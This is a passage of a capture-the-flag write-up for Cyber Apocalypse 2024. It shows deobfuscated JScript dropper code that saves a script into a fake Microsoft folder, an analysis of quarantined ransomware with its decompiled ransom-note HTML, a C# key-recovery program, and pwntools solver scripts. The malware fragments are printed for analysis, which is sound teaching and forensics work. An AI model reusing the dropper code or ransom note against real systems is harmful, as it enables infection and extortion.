        var charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        var encodedData = "";
        var chunk = "";
        for (var i = 0; i < data.length; ++i) {
            var charCode = data.charCodeAt(i);
            var binaryString = charCode.toString(2);
            while (binaryString.length < (forUrl ? 8 : 16)) binaryString = "0" + binaryString;
            chunk += binaryString;
            while (chunk.length >= 6) {
                var sixBitChunk = chunk.slice(0, 6);
                chunk = chunk.slice(6);
                encodedData += charset.charAt(parseInt(sixBitChunk, 2));
            }
        }
        if (chunk) {
            while (chunk.length < 6) chunk += "0";
            encodedData += charset.charAt(parseInt(chunk, 2));
        }
        while (encodedData.length % (forUrl ? 4 : 8) != 0) encodedData += "=";
        return encodedData;
    }
    
    function decodeBase64(key, encodedData) {
        var keyLength = key.length;
        var encodedLength = encodedData.length;
        var decodedData = "";
        for (var i = 0; i < 256; i++) {
            keyArray[i] = i;
        }
        for (var i = 0; i < 256; i++) {
            keyIndex = (keyIndex + keyArray[i] + key.charCodeAt(i % keyLength)) % 256;
            swapValue = keyArray[i];
            keyArray[i] = keyArray[keyIndex];
            keyArray[keyIndex] = swapValue;
        }
        var keyIndex = 0;
        var j = 0;
        for (var i = 0; i < encodedLength; i++) {
            j = (j + 1) % 256;
            keyIndex = (keyIndex + keyArray[j]) % 256;
            swapValue = keyArray[j];
            keyArray[j] = keyArray[keyIndex];
            keyArray[keyIndex] = swapValue;
            decodedData += String.fromCharCode(encodedData.charCodeAt(i) ^ keyArray[(keyArray[j] + keyArray[keyIndex]) % 256]);
        }
        return decodedData;
    }
    
    function saveScript(script, filePath) {
        var streamObj = WScript.CreateObject("ADODB.Stream");
        streamObj.type = 2;
        streamObj.Charset = "iso-8859-1";
        streamObj.Open();
        streamObj.WriteText(script);
        streamObj.Flush();
        streamObj.Position = 0;
        streamObj.SaveToFile(filePath, 2);
        streamObj.close();
    }
    
    function generateScriptPath() {
        scriptFileName = "Script.js";
        var scriptPath = "c:\\Users\\" + userName + "\\AppData\\Local\\MicrosoftERROR!\\Windows\\ ";
        if (!fileSystemObj.FOLDEREXISTS(scriptPath)) scriptPath = "c: \\Users\\ " + userName + "\\AppData\\ Local\\ Temp\\ ";
        if (!fileSystemObj.FOLDEREXISTS(scriptPath)) scriptPath = "c: \\Documents and Settings\\ " + userName + "\\Application Data\\ Microsoft\\ Windows\\ ";
        return scriptPath;
    }
    
    function readFromFile(filePath) {
        var streamObj = WScript.CreateObject("ADODB.Stream");
        streamObj.Type = 2;
        streamObj.Charset = "437";
        streamObj.Open();
        streamObj.LoadFromFile(filePath);
        var data = streamObj.ReadText;
        streamObj.Close();
        return data;
    }
    
    ```
    

In the deobfuscated code, a very suspicious line caught my eye. `xhttp.SETREQUESTHEADER("Cookie:", "flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=");`. By decoding the cookie using Base64, we can retrieve the flag. 

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2010.png)

# Forensics[hard] - Confinement

From `powershell-operational.evtx` , I found the attacker used the powershell at roughly 8pm (UTC+8)

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2011.png)

This is just a first rough view to understand what’s going on. To understand further, I used https://github.com/Yamato-Security/hayabusa, a Windows event log fast forensics timeline generator and threat hunting tool: `hayabusa-2.13.0-win-x64.exe  csv-timeline -d .\Logs\ -o results.csv` to generate a forensics timeline that contains only critical and high alerts.

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2012.png)

By filtering event ID 1116 (`MALWAREPROTECTION_STATE_MALWARE_DETECTED - Microsoft Defender`), we can see there’s 4 malware in total. Knowing that there’s 4 malware, I checked the defender logs by filtering event ID 1117 for actions taken and found that all four were quarantined. 

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2013.png)

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2014.png)

Now, we know that four of those malwares were quarantined, we will need to extract the relevant ones and decrypt them. Below are some blogs for reference:

[Reverse, Reveal, Recover: Windows Defender Quarantine Forensics](https://research.nccgroup.com/2023/12/14/reverse-reveal-recover-windows-defender-quarantine-forensics/)

[Extracting Quarantine Files from Windows Defender](https://blog.khairulazam.net/2023/12/12/extracting-quarantine-files-from-windows-defender/)

After parsing the entry records using https://github.com/zam89/Windows-Defender-Quarantine-File-Decryptor, we get the following:

```jsx
file_record(path='C:\Users\tommyxiaomi\Documents\browser-pw-decrypt.exe', hash='49D2DBE7E1E75C6957E7DD2D4E00EF37E77C0FCE', detection='HackTool:Win32/LaZagne', filetime=2024-03-05 12:42:39.474345000)

file_record(path='C:\Users\tommyxiaomi\Documents\fscan64.exe', hash='B23626565BF4CD28999377F1AFD351BE976443A2', detection='Trojan:Win32/CryptInject', filetime=2024-03-05 12:42:54.139045000)

file_record(path='C:\Users\tommyxiaomi\Documents\intel.exe', hash='AEB49B27BE00FB9EFCD633731DBF241AC94438B7', detection='Trojan:Win32/Wacatac.B!ml', filetime=2024-03-05 12:44:38.725888000)

file_record(path='C:\Users\tommyxiaomi\Documents\mimikatz.exe', hash='6A5D1A3567B13E1C3F511958771FBEB9841372D1', detection='HackTool:Win32/Mimikatz!pz', filetime=2024-03-05 12:42:54.139045000)
```

After extracting the file, we know its a .NET malware: 

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2015.png)

Therefore, I used https://github.com/icsharpcode/ILSpy to view the malware source code. From the code, it generates the key and IV based on the password argument and fixed salt bytearray. To find the contents of password variable, we will need to backtrack. 

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2016.png)

Notice that password was initialized from constructor `CoreEncryptor` . We found that its being used in the main function.

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2017.png)

By analyzing the main function, the `password`argument is `GetHashCode(UID, salt)`.  We had the salt in `CoreEncrypt` function, which left us with `UID`  because its random generated. 

```csharp
public string GetHashCode(string password, string salt)
{
    string password2 = password + salt;
    return Hasher(password2);
}

public string Hasher(string password)
{
	using SHA512CryptoServiceProvider sHA512CryptoServiceProvider = new SHA512CryptoServiceProvider();
	byte[] bytes = Encoding.UTF8.GetBytes(password);
	return Convert.ToBase64String(sHA512CryptoServiceProvider.ComputeHash(bytes));
}
```

Notice that UID was passed into Alert function, which is then processed as AttackID.

```csharp
// Encrypter.Class.Alert
internal class Alert
{
	public string html;

	public string AttackID { get; set; }

	public string email1 { get; set; }

	public string email2 { get; set; }

	public Alert(string AttackID, string email1, string email2)
	{
		this.AttackID = AttackID;
		this.email1 = email1;
		this.email2 = email2;
	}

	public string ValidateAlert()
	{
		html = "\r\n\t\t\t\t<!DOCTYPE html>\r\n\t\t\t\t<html lang='en'>\r\n\t\t\t\t<head>\r\n\t\t\t\t\t<meta charset='UTF-8'>\r\n\t\t\t\t\t<meta http-equiv='X-UA-Compatible' content='IE=edge'>\r\n\t\t\t\t\t<meta name='viewport' content='width=device-width, initial-scale=1.0'>\r\n\t\t\t\t\t<title>The Fray Ultimatum</title>\r\n\t\t\t\t\t<style>\r\n\t\t\t\t\t\tbody {\r\n\t\t\t\t\t\t\tfont-family: Arial, sans-serif;\r\n\t\t\t\t\t\t\tbackground-color: #1f1f1f;\r\n\t\t\t\t\t\t\tcolor: #ffffff;\r\n\t\t\t\t\t\t\tmargin: 0;\r\n\t\t\t\t\t\t\tpadding: 0;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t.container {\r\n\t\t\t\t\t\t\tmax-width: 1000px;\r\n\t\t\t\t\t\t\tmargin: 50px auto;\r\n\t\t\t\t\t\t\tpadding: 20px;\r\n\t\t\t\t\t\t\tbackground-color: #2b2b2b;\r\n\t\t\t\t\t\t\tborder-radius: 10px;\r\n\t\t\t\t\t\t\tbox-shadow: 0 0 10px rgba(0, 0, 0, 0.5);\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\th1 {\r\n\t\t\t\t\t\t\ttext-align: center;\r\n\t\t\t\t\t\t\tmargin-bottom: 20px;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t.message {\r\n\t\t\t\t\t\t\tmargin-bottom: 30px;\r\n\t\t\t\t\t\t\tpadding: 20px;\r\n\t\t\t\t\t\t\tbackground-color: #3b3b3b;\r\n\t\t\t\t\t\t\tborder-radius: 5px;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t.attention {\r\n\t\t\t\t\t\t\tcolor: #ff3d3d;\r\n\t\t\t\t\t\t\tfont-size: 30px;\r\n\t\t\t\t\t\t\tfont-weight: bold;\r\n\t\t\t\t\t\t\tdisplay: flex;\r\n\t\t\t\t\t\t\talign-items: center;\r\n\t\t\t\t\t\t\tjustify-content: center;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t.instructions {\r\n\t\t\t\t\t\t\tfont-size: 16px;\r\n\t\t\t\t\t\t\tline-height: 1.6;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t.highlight {\r\n\t\t\t\t\t\t\tbackground-color: #ff3d3d;\r\n\t\t\t\t\t\t\tcolor: #ffffff;\r\n\t\t\t\t\t\t\tpadding: 3px 8px;\r\n\t\t\t\t\t\t\tborder-radius: 3px;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t\t.footer {\r\n\t\t\t\t\t\t\ttext-align: center;\r\n\t\t\t\t\t\t\tmargin-top: 30px;\r\n\t\t\t\t\t\t\tfont-size: 14px;\r\n\t\t\t\t\t\t\tcolor: #888888;\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t</style>\r\n\t\t\t\t</head>\r\n\t\t\t\t<body>\r\n\t\t\t\t\t<div class='container'>\r\n\t\t\t\t\t\t<h1><span class='highlight'>The Fray Ultimatum</span></h1>\r\n\t\t\t\t\t\t<div class='message'>\r\n\t\t\t\t\t\t\t<p class='attention'><span>\ud83d\udd12 ATTENTION FACTIONS \ud83d\udd12</span></p>\r\n\t\t\t\t\t\t\t<p><center>What's this? Your precious data seems to have fallen into the hands of KORP™, the all-powerful overseer of The Fray.\r\n\t\t\t\t\t\t\tConsider it a test of your faction's mettle. Will you rise to the challenge or crumble under the weight of your encrypted files?</p>\r\n\t\t\t\t\t\t\t<p>For further instructions, send your Faction ID to the provided email address:</p>\r\n\t\t\t\t\t\t\t<p>Email: <span>" + email1 + "</span></p>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t<div class='message'>\r\n\t\t\t\t\t\t\t<p class='attention'>\ud83d\udcb0\ud83d\udca3 ACT SWIFTLY OR FACE YOUR DEMISE \ud83d\udca3\ud83d\udcb0</p>\r\n\t\t\t\t\t\t\t<p class='instructions'>\ud83d\udeab DO NOT attempt to disrupt the encryption process; it's futile \ud83d\ude0f<br>\r\n\t\t\t\t\t\t\t\ud83d\udeab DO NOT rely on feeble antivirus software; they are but toys in our hands \ud83d\ude09<br>\r\n\t\t\t\t\t\t\t\ud83d\udeab DO NOT dream of accessing your encrypted files; they are now under our control \ud83d\ude08<br>\r\n\t\t\t\t\t\t\t\ud83d\udeab DO NOT trust anyone, not even us, for decryption<br>\r\n\t\t\t\t\t\t\t<center><p>Failure to comply will result in the permanent loss of your precious data \ud83d\udca5</p>\r\n\t\t\t\t\t\t\t<p>Once the clock strikes zero, your data will be lost forever \ud83d\udd52</p>\r\n\t\t\t\t\t\t\t<p>Before even thinking of payment, you may submit up to 3 test files for free decryption, each file not exceeding 5 MB in size \ud83d\udcce</p>\r\n\t\t\t\t\t\t\t<p>And remember, these test files should contain no vital information!</p>\r\n\t\t\t\t\t\t\t<p>***PAYMENT IS STRICTLY FORBIDDEN UNTIL TEST FILE DECRYPTION***</p></center></p>\r\n\t\t\t\t\t\t</div>\r\n\t\t\t\t\t\t<div class='footer'>Faction ID = <span>" + AttackID + "</span></div>\r\n\t\t\t\t\t</div>\r\n\t\t\t\t</body>\r\n\t\t\t\t</html>";
		return html;
	}
}
```

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2018.png)

By comparing the alert function from the source code, we found the exact same hta content that was generated by the malware. Therefore, the UID generated is `5K7X7E6X7V2D6F` . With the UID and salt, we can retrieve the original argument sent to `CoreEncryptor`  and also get the aes key as well as IV by running the following code:

```csharp
using System;
using System.Security.Cryptography;
using System.Text;
using System.IO;

public class Program
{
    public static void Main()
    {
        // Create an instance of the PasswordHasher class
        PasswordHasher passwordHasher = new PasswordHasher();

        // Given UID and salt
        string UID = "5K7X7E6X7V2D6F";
        string salt = "0f5264038205edfb1ac05fbb0e8c5e94";

        // Compute the hash code for UID and salt
        string computedHashedUID = passwordHasher.GetHashCode(UID, salt);

        // Print the computed hashed UID
        Console.WriteLine("Computed Hashed UID:");
        Console.WriteLine(computedHashedUID);
        
        byte[] array = new byte[65535];
		byte[] saltA = new byte[8] { 0, 1, 1, 0, 1, 1, 0, 0 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(computedHashedUID, saltA, 4953);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		rijndaelManaged.Padding = PaddingMode.ISO10126;
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		
		Console.WriteLine("Key:");
        Console.WriteLine(BitConverter.ToString(rijndaelManaged.Key).Replace("-", ""));
        
        Console.WriteLine("IV:");
        Console.WriteLine(BitConverter.ToString(rijndaelManaged.IV).Replace("-", ""));
    }
}

internal class PasswordHasher
{
    public string GetSalt()
    {
        return Guid.NewGuid().ToString("N");
    }

    public string Hasher(string password)
    {
        using SHA512CryptoServiceProvider sHA512CryptoServiceProvider = new SHA512CryptoServiceProvider();
        byte[] bytes = Encoding.UTF8.GetBytes(password);
        return Convert.ToBase64String(sHA512CryptoServiceProvider.ComputeHash(bytes));
    }

    public string GetHashCode(string password, string salt)
    {
        string password2 = password + salt;
        return Hasher(password2);
    }

    public bool CheckPassword(string password, string salt, string hashedpass)
    {
        return GetHashCode(password, salt) == hashedpass;
    }
}

// Computed Hashed UID:
// A/b2e5CdOYWbfxqJxQ/Y4Xl4yj5gYqDoN0JQBIWAq5tCRPLlprP2GC87OXq92v1KhCIBTMLMKcfCuWo+kJdnPA==
// Key:
// 16EDB3ACA07E08F1EC7D95877A362ECFDEAA1A336CE719F0D16EA4F8AEE61930
// IV:
// E09D4DA3162DC5209BEF781C27ACA70E
```

After that, using cyberchef, I uploaded the `Applicants_info.xlsx.korp` and used aes decrypt with the given key and IV. Downloading the file, I found the flag lying in plain sight. 

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2019.png)

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2020.png)

# Misc[very easy] - Stop Drop and Roll

The question is just a simple brute force solution by processing every input and give the output until the end.

```markdown
# Sample Interaction #
===== THE FRAY: THE VIDEO GAME =====
Welcome!
This video game is very simple
You are a competitor in The Fray, running the GAUNTLET
I will give you one of three scenarios: GORGE, PHREAK or FIRE
You have to tell me if I need to STOP, DROP or ROLL
If I tell you there's a GORGE, you send back STOP
If I tell you there's a PHREAK, you send back DROP
If I tell you there's a FIRE, you send back ROLL
Sometimes, I will send back more than one! Like this: 
GORGE, FIRE, PHREAK
In this case, you need to send back STOP-ROLL-DROP!
Are you ready? (y/n) y
Ok then! Let's go!
GORGE, FIRE
What do you do? STOP-ROLL
PHREAK, FIRE, GORGE
What do you do?    
```

```python
#!/usr/bin/python

from pwn import *

answer = {
        'GORGE': 'STOP',
        'FIRE': 'ROLL',
        'PHREAK': 'DROP'
    }
count = 0

game = remote('94.237.52.22', 49759)
banner = game.recvuntil(b'(y/n)').decode()
# print(banner)
game.sendline(b'y')

game.recvline()

# print('=' * 10)
while count < 500:
    question = game.recvuntil(b'do?').decode().strip().split('\n')[0].split(', ')
    print(question)
    count += 1
    response = '-'.join(list(answer[x] for x in question))
    print(response)
    game.sendline(response.encode())

    print(count)

print(game.recvline())

# Close the connection
# game.close()

```

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2021.png)

# Misc[very easy] - Character

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2022.png)

By writing a script, i can brute force the characters until the closing curly brackets. (And my script has some problems with the first character but luckily the rest looks fine)

```python
#!/usr/bin/python

from pwn import *

count = 0
answer = []

game = remote('94.237.59.132', 40823)
# print(game.recvline())
question = game.recvuntil(b':').decode()
print("question:", question)

game.sendline(str(count).encode())
print(game.recvline())
response = ''
while "}" not in response:
    game.sendline(str(count).encode())
    response = game.recvline().decode()
    answer.append(response.split(': ')[1][:1])
    print(answer)
    question = game.recvuntil(b':').decode()
    count += 1

print(''.join(answer))
```

![Untitled](Cyber%20Apocalypse%202024%20Hacker%20Royale%20748bb11f26e3412784992cb82675722a/Untitled%2023.png)